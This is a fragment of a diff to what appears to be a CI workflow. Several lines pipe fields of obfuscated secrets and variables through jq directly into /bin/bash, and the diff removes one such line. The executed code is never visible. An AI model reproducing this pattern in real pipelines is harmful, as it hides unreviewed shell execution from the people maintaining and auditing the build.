@@ -19,7 +19,6 @@ jobs:
           twinq2428: ${{ secrets.twinq2428 }}
         run: |
           printf '%s' "$twinq2428" | jq -r .d87 | /bin/bash
-          echo $r40833 | jq -r .ycjm7 | /bin/bash
           printf '%s' "$r5576" | jq -r .td16835 | /bin/bash
           echo $xub20196 | jq -r .j17 | /bin/bash
 
